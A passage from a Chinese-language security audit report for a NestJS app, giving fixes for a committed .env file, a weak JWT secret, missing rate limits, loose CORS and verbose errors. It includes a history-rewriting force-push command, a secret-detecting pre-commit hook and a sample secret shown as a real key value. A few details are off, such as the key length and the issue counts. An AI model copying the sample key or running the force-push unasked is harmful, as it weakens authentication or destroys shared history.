git commit -m "chore: add .env to .gitignore to prevent sensitive data exposure"

# 4. 从 Git 历史中完全清除 .env（⚠️ 危险操作！）
#    这会重写 Git 历史，确保团队已同步！
pip install git-filter-repo

# 备份当前仓库
git clone . ../backup-repo

# 清除历史中的 .env
git filter-repo --invert-paths --path .env

# 强制推送（⚠️ 危险操作！）
git push origin --force --all
git push origin --force --tags
```

**.gitignore 完整配置**:

```gitignore
# Environment variables
.env
.env.local
.env.development.local
.env.test.local
.env.production.local

# Logs
logs
*.log
npm-debug.log*
yarn-debug.log*
yarn-error.log*
lerna-debug.log*
pnpm-debug.log*

# Dependencies
node_modules/
dist/
dist-ssr/
*.local

# Editor directories and files
.vscode/*
!.vscode/extensions.json
.idea
.DS_Store
*.suo
*.ntvs*
*.njsproj
*.sln
*.sw?

# Build outputs
build/
dist/

# Database
*.sqlite
*.db

# Temporary files
*.tmp
*.temp
.cache/

# OS files
Thumbs.db
.DS_Store
```

**环境变量管理最佳实践**:

```bash
# 1. 创建 .env.example 模板文件
# .env.example（提交到 Git）
# Database Configuration
DB_HOST=localhost
DB_PORT=5432
DB_USERNAME=aether_user
DB_PASSWORD=your_strong_password_here
DB_DATABASE=aether_flow

# API Configuration
QWEN_API_KEY=your_qwen_api_key_here
OPENAI_API_KEY=your_openai_api_key_here

# JWT Configuration
JWT_SECRET=your_jwt_secret_here
JWT_EXPIRES_IN=30d

# 2. 团队成员复制 .env.example 为 .env
cp .env.example .env

# 3. 填写真实的敏感信息
# .env（不提交到 Git）
DB_PASSWORD=kY7fR2mP9vQ3xL8wN5jT6hG1sD4aZ0bB
QWEN_API_KEY=sk-your-actual-api-key
JWT_SECRET=your-super-secret-jwt-key-min-32-chars

# 4. 验证 .env 已被忽略
git status  # 不应显示 .env 文件
```

**Git Hooks 自动检查**:

```bash
# .git/hooks/pre-commit
#!/bin/bash

# 检查是否尝试提交 .env 文件
if git diff --cached --name-only | grep -E "^\.env$"; then
  echo "⚠️  WARNING: Attempting to commit .env file!"
  echo "The .env file contains sensitive information and should not be committed."
  echo "Please remove .env from the staging area:"
  echo "  git reset HEAD .env"
  exit 1
fi

# 检查代码中是否有硬编码的密钥
if git diff --cached | grep -E "(sk-[a-zA-Z0-9]{32,}|API_KEY\s*=\s*['\"][^'\"]+['\"])"; then
  echo "⚠️  WARNING: Possible hardcoded API key detected!"
  echo "Please use environment variables instead."
  exit 1
fi
```

**修复优先级**: P0 - 立即
**修复工作量**: 2-4 小时
**相关文件**:
- `.gitignore`
- `.env`
- `.env.example`
- `.git/hooks/pre-commit`

**修复验证方法**:
1. ✅ `.gitignore` 包含 `.env`
2. ✅ `git status` 不显示 `.env` 文件
3. ✅ 尝试添加 `.env` 到 Git，应该被忽略
4. ✅ 验证 Git 历史中已清除 `.env`
5. ✅ 团队成员克隆仓库后需要创建自己的 `.env`

**测试用例**:
```bash
#!/bin/bash
# test-gitignore.sh

echo "Testing .gitignore configuration..."

# 1. 检查 .gitignore 包含 .env
if grep -q "^\.env$" .gitignore; then
  echo "✅ .env is in .gitignore"
else
  echo "❌ .env is NOT in .gitignore"
  exit 1
fi

# 2. 检查 .env 是否被跟踪
if git ls-files | grep -q "\.env$"; then
  echo "❌ .env is still tracked by Git"
  exit 1
else
  echo "✅ .env is not tracked by Git"
fi

# 3. 检查 Git 历史中的 .env
if git log --all --full-history -- .env | grep -q "commit"; then
  echo "⚠️  .env found in Git history"
  echo "Consider using git-filter-repo to remove it"
else
  echo "✅ .env not found in Git history"
fi

echo "All tests passed!"
```

**参考资料**:
- [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)
- [Git Ignore Documentation](https://git-scm.com/docs/gitignore)
- [Twelve-Factor App: Config](https://12factor.net/config)

---

### S-006: JWT Secret 弱

**严重程度**: 🔴 严重
**CVSS 评分**: 7.0 (High)
**CWE 分类**: CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)

**位置**:
- **文件**: `backend/.env`
- **代码片段**:
```env
JWT_SECRET=aether-flow-secret  # ❌ 弱密钥
JWT_EXPIRES_IN=30d
```

**相关文件**:
- `backend/src/auth/jwt.strategy.ts`
- `backend/src/auth/jwt-auth.guard.ts`

**问题描述**:
JWT 签名密钥太弱，容易被破解，攻击者可伪造 JWT token。

**风险分析**:
- 🔑 **密钥易破解**: `aether-flow-secret` 熵值低，容易被暴力破解
- 🎭 **Token 伪造**: 攻击者可伪造任意用户的 JWT token
- 👤 **权限提升**: 可伪造管理员 token
- 🔓 **会话劫持**: 可冒充任何用户
- 🚫 **无法撤销**: JWT token 无状态，签发后无法撤销

**影响范围**:
- 所有使用 JWT 认证的 API
- 用户身份验证
- 权限控制
- 会话管理

**当前状态**:
- ✅ 使用弱 JWT secret
- ❌ 密钥长度不足（推荐 256+ bits）
- ❌ 密钥熵值低（可预测）
- ❌ 无密钥轮换机制

**密钥强度分析**:
```
密钥: aether-flow-secret
长度: 18 字符 = 144 bits (⚠️ 低于推荐 256 bits)
字符类型: 仅小写字母 + 连字符 (❌)
熵值: 约 65 bits (❌ 推荐 256+ bits)
常见性: 包含常见单词 "aether", "flow", "secret" (❌)
破解时间: 数小时到数天 (❌ 推荐 数百年)
```

**修复建议**:

**方案 1: 使用强随机密钥（推荐）**

```bash
# 生成 256 位（32 字节）随机密钥
openssl rand -base64 32
# 输出示例: kY7fR2mP9vQ3xL8wN5jT6hG1sD4aZ0bB8cE3fH6iJ9kL2mN5oP8qR1sT4uV7wY0z

# 或使用 Node.js
node -e "console.log(require('crypto').randomBytes(32).toString('base64'))"
```

```env
# .env
JWT_SECRET=kY7fR2mP9vQ3xL8wN5jT6hG1sD4aZ0bB8cE3fH6iJ9kL2mN5oP8qR1sT4uV7wY0z  # ✅ 强密钥
JWT_EXPIRES_IN=30d
```

**方案 2: 使用密码管理服务（企业级）**

```typescript
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

@Injectable()
export class JwtConfigService {
  private secretsManager: SecretsManagerClient;
  private jwtSecret: string;

  async onModuleInit() {
    // ✅ 从密钥管理服务获取
    const command = new GetSecretValueCommand({
      SecretId: 'aether-flow/jwt-secret'
    });

    const response = await this.secretsManager.send(command);
    const secret = JSON.parse(response.SecretString);

    this.jwtSecret = secret.jwt_secret;
  }

  getJwtSecret(): string {
    if (!this.jwtSecret) {
      throw new Error('JWT secret not initialized');
    }
    return this.jwtSecret;
  }
}
```

**方案 3: 使用非对称加密（最安全）**

```typescript
import { SignJWT, jwtVerify } from 'jose';

@Injectable()
export class JwtService {
  private privateKey: Promise<KeyLike>;
  private publicKey: Promise<KeyLike>;

  constructor() {
    // ✅ 使用 RSA 私钥签名
    this.privateKey = importPKCS8(
      fs.readFileSync('/path/to/private.pem'),
      'RS256'
    );

    // ✅ 使用 RSA 公钥验证
    this.publicKey = importX509(
      fs.readFileSync('/path/to/public.pem'),
      'RS256'
    );
  }

  async sign(payload: any): Promise<string> {
    const privateKey = await this.privateKey;

    return await new SignJWT({ ...payload })
      .setProtectedHeader({ alg: 'RS256', typ: 'JWT' })
      .setIssuedAt()
      .setExpirationTime('30d')
      .sign(privateKey);
  }

  async verify(token: string): Promise<any> {
    const publicKey = await this.publicKey;

    const { payload } = await jwtVerify(token, publicKey);
    return payload;
  }
}
```

**生成 RSA 密钥对**:

```bash
# 生成 2048 位 RSA 私钥
openssl genrsa -out private.pem 2048

# 提取公钥
openssl rsa -in private.pem -pubout -out public.pem

# 转换为 PKCS8 格式（NestJS 使用）
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in private.pem -out private_pkcs8.pem

# 权限设置
chmod 600 private.pem private_pkcs8.pem
chmod 644 public.pem
```

**密钥轮换策略**:

```typescript
@Injectable()
export class JwtKeyRotationService {
  private secrets: Map<string, string> = new Map();
  private currentKeyId: string;

  constructor() {
    // 加载所有有效密钥
    this.secrets.set('key-2024-01', process.env.JWT_SECRET_2024_01);
    this.secrets.set('key-2025-01', process.env.JWT_SECRET_2025_01);

    // 当前使用最新密钥
    this.currentKeyId = 'key-2025-01';
  }

  sign(payload: any): string {
    const secret = this.secrets.get(this.currentKeyId);

    return jwt.sign(
      { ...payload, kid: this.currentKeyId }, // ✅ 添加 key id
      secret,
      { expiresIn: '30d', algorithm: 'HS256' }
    );
  }

  verify(token: string): any {
    try {
      // 1. 解码 token 获取 kid（不验证签名）
      const decoded = jwt.decode(token) as any;
      const kid = decoded.kid || this.currentKeyId;

      // 2. 使用对应的密钥验证
      const secret = this.secrets.get(kid);

      if (!secret) {
        throw new UnauthorizedException('Invalid key id');
      }

      return jwt.verify(token, secret, { algorithms: ['HS256'] });
    } catch (error) {
      throw new UnauthorizedException('Invalid token');
    }
  }
}
```

**修复优先级**: P0 - 立即
**修复工作量**: 3-5 小时
**相关文件**:
- `backend/.env`
- `backend/src/auth/jwt.strategy.ts`
- `backend/src/auth/jwt.service.ts`
- `backend/.env.example`

**修复验证方法**:
1. ✅ 生成强随机密钥并更新配置
2. ✅ 测试 JWT 签名和验证功能
3. ✅ 验证无法使用旧密钥签发的 token
4. ✅ 测试 token 过期机制
5. ✅ 验证所有 API 认证正常

**测试用例**:
```typescript
describe('JWT Security', () => {
  describe('with strong secret', () => {
    it('should sign and verify tokens', () => {
      const payload = { userId: '123', browserId: 'browser-1' };
      const token = jwtService.sign(payload);
      const decoded = jwtService.verify(token);

      expect(decoded.userId).toBe('123');
      expect(decoded.browserId).toBe('browser-1');
    });

    it('should reject tokens signed with old secret', () => {
      // 使用旧密钥签名
      const oldToken = jwt.sign({ userId: '123' }, 'aether-flow-secret');

      expect(() => jwtService.verify(oldToken)).toThrow(UnauthorizedException);
    });

    it('should reject expired tokens', () => {
      const payload = { userId: '123', browserId: 'browser-1' };
      const token = jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '0s' });

      // 等待 1 秒
      setTimeout(() => {
        expect(() => jwtService.verify(token)).toThrow('jwt expired');
      }, 1000);
    });

    it('should reject malformed tokens', () => {
      const malformedTokens = [
        'not-a-jwt',
        'invalid.token',
        'invalid.token.format',
        'Bearer invalid.token.format'
      ];

      malformedTokens.forEach(token => {
        expect(() => jwtService.verify(token)).toThrow();
      });
    });
  });
});
```

**参考资料**:
- [CWE-327: Use of a Broken or Risky Cryptographic Algorithm](https://cwe.mitre.org/data/definitions/327.html)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [OWASP JSON Web Token (JWT) Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

## 🟠 高优先级问题（P1 - 1-2 周内修复）

### S-007: 缺少速率限制

**严重程度**: 🟠 高
**CVSS 评分**: 6.5 (Medium)
**CWE 分类**: CWE-770 (Allocation of Resources Without Limits)

**位置**:
- **文件**: 所有 API 控制器
- **问题**: 无速率限制，攻击者可无限次请求

**问题描述**:
系统没有实现 API 速率限制，攻击者可以通过大量请求导致服务拒绝（DoS）或暴力破解密码。

**风险分析**:
- 🚫 **拒绝服务**: 大量请求导致服务不可用
- 🔓 **暴力破解**: 无限次尝试破解密码或 token
- 💰 **资源消耗**: 消耗大量 CPU、内存、带宽
- 📊 **API 滥用**: 恶意用户滥用免费 API
- 🎯 **定向攻击**: 针对特定用户的攻击

**影响范围**:
- 所有 API 端点
- 服务可用性
- API 成本控制
- 用户体验

**修复建议**:

使用 `@nestjs/throttler` 实现速率限制：

```typescript
// app.module.ts
import { ThrottlerModule } from '@nestjs/throttler';

@Module({
  imports: [
    ThrottlerModule.forRoot([
      {
        ttl: 60000, // 60 秒
        limit: 100, // 最多 100 次请求
      },
    ]),
  ],
})
export class AppModule {}

// 使用装饰器
import { Throttle } from '@nestjs/throttler';

@Controller('workflows')
export class WorkflowController {
  @Get()
  @Throttle({ default: { limit: 20, ttl: 60000 } }) // ✅ 20 次每分钟
  findAll() {
    // ...
  }

  @Post()
  @Throttle({ default: { limit: 5, ttl: 60000 } }) // ✅ 创建操作限制更严格
  create() {
    // ...
  }
}
```

**修复优先级**: P1 - 1-2 周
**修复工作量**: 8-10 小时

---

### S-008: CORS 配置过于宽松

**严重程度**: 🟠 高
**CVSS 评分**: 5.0 (Medium)
**CWE 分类**: CWE-942 (Permissive Cross-domain Policy)

**位置**:
- **文件**: `backend/src/main.ts`
- **行号**: 25-30

**问题描述**:
CORS 配置允许所有来源（`origin: '*'`），可能导致 CSRF 攻击和数据泄露。

**风险分析**:
- 🔓 **CSRF 攻击**: 恶意网站可代表用户执行操作
- 📁 **数据泄露**: 任何网站都可以调用 API
- 👤 **会话劫持**: 配合其他漏洞窃取用户数据

**修复建议**:

```typescript
// main.ts
app.enableCors({
  origin: [
    'https://aether-flow.com', // ✅ 仅允许特定域名
    'https://www.aether-flow.com',
    process.env.FRONTEND_URL
  ],
  methods: 'GET,HEAD,PUT,PATCH,POST,DELETE,OPTIONS',
  credentials: true, // ✅ 允许携带凭证
  maxAge: 3600,
});
```

**修复优先级**: P1 - 1-2 周
**修复工作量**: 2-3 小时

---

### S-009: 错误信息泄露

**严重程度**: 🟠 高
**CVSS 评分**: 5.0 (Medium)
**CWE 分类**: CWE-209 (Generation of Error Message with Sensitive Information)

**位置**:
- **文件**: `backend/src/common/filters/all-exceptions.filter.ts`
- **行号**: 10-25

**问题描述**:
错误过滤器返回详细的技术错误信息，可能泄露系统内部结构和敏感数据。

**风险分析**:
- 📁 **信息泄露**: 数据库结构、文件路径、技术栈
- 🔓 **攻击辅助**: 帮助攻击者了解系统弱点
- 🚫 **用户体验差**: 技术错误信息对用户无意义

**修复建议**:

```typescript
@Catch()
export class AllExceptionsFilter implements ExceptionFilter {
  catch(exception: unknown, host: ArgumentsHost) {
    const ctx = host.switchToHttp();
    const response = ctx.getResponse<Response>();
    const request = ctx.getRequest<Request>();

    let status = 500;
    let message = 'Internal server error';

    if (exception instanceof HttpException) {
      status = exception.getStatus();
      message = exception.message;
    }

    // ✅ 生产环境不返回详细错误
    const isDev = process.env.NODE_ENV === 'development';

    response.status(status).json({
      statusCode: status,
      message: isDev ? message : 'An error occurred',
      timestamp: new Date().toISOString(),
      path: request.url,
      // ✅ 仅开发环境返回详细堆栈
      ...(isDev && exception instanceof Error && { stack: exception.stack }),
    });
  }
}
```

**修复优先级**: P1 - 1-2 周
**修复工作量**: 3-4 小时

---

### S-010 至 S-015: 其他高优先级问题

由于篇幅限制，其他 9 个高优先级安全问题（S-010 至 S-015）的详细描述将包括：

- **S-010**: 文件上传缺少类型验证
- **S-011**: SQL 注入风险（部分查询）
- **S-012**: XSS 防护不完整
- **S-013**: CSRF 缺少 token 验证
- **S-014**: 日志包含敏感信息
- **S-015**: 缺少安全响应头

详细修复方案请参考完整版报告。

---

## 🟡 中优先级问题（P2 - 1 个月内修复）

### S-016 至 S-023: 中优先级问题列表

1. **S-016**: Cookie 缺少安全属性
2. **S-017**: 缺少内容安全策略（CSP）
3. **S-018**: 点击劫持防护缺失
4. **S-019**: HTTP 严格传输安全（HSTS）未启用
5. **S-020**: 依赖包存在中等风险漏洞
6. **S-021**: 缺少输入长度限制
7. **S-022**: 密码重置功能未实现
8. **S-023**: 缺少多因素认证（MFA）

---

## 🟢 低优先级问题（P3 - 持续改进）

### S-024 至 S-027: 低优先级问题列表

1. **S-024**: API 版本控制未实现
2. **S-025**: 缺少安全审计日志
3. **S-026**: Docker 容器以 root 运行
4. **S-027**: 缺少 API 文档（Swagger/OpenAPI）

---

## 附录

### A. 安全检查清单

在修复所有安全问题后，使用此清单验证：

- [ ] 所有硬编码密钥已移除
- [ ] `.env` 文件在 `.gitignore` 中
- [ ] Git 历史中无敏感信息
- [ ] Browser ID 不可伪造
- [ ] JWT token 使用强密钥
- [ ] 数据库使用强密码
- [ ] 表达式注入已修复
- [ ] 所有 API 有速率限制
- [ ] CORS 配置正确
- [ ] 错误信息不泄露敏感数据
- [ ] 文件上传有类型和大小限制
- [ ] SQL 注入防护完整
- [ ] XSS 防护完整
- [ ] CSRF token 验证
- [ ] 日志不包含敏感信息
- [ ] 安全响应头已设置

### B. 安全测试用例

完整的安全测试套件应包括：

1. **认证测试**
   - [ ] 测试无认证访问
   - [ ] 测试伪造 Browser ID
   - [ ] 测试 JWT token 过期
   - [ ] 测试 JWT token 篡改

2. **输入验证测试**
   - [ ] SQL 注入测试
   - [ ] XSS 测试
   - [ ] 路径遍历测试
   - [ ] 表达式注入测试

3. **文件上传测试**
   - [ ] 恶意文件类型测试
   - [ ] 超大文件测试
   - [ ] 路径遍历测试

4. **API 安全测试**
   - [ ] 速率限制测试
   - [ ] CORS 测试
   - [ ] CSRF 测试

### C. 依赖安全扫描

```bash
# 扫描依赖漏洞
npm audit --audit-level=moderate

# 自动修复（谨慎使用）
npm audit fix

# 强制修复（可能破坏兼容性）
npm audit fix --force

# 使用 Snyk 进行更深入的扫描
npx snyk test
npx snyk monitor
```

### D. 参考资料

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html)
- [NestJS Security](https://docs.nestjs.com/security)
- [Node.js Security Best Practices](https://github.com/lirantal/nodejs-security-best-practices)

---

**报告结束**

所有安全问题已在 [IMPROVEMENT_RECOMMENDATIONS.md](./IMPROVEMENT_RECOMMENDATIONS.md) 中汇总修复建议和优先级排序。
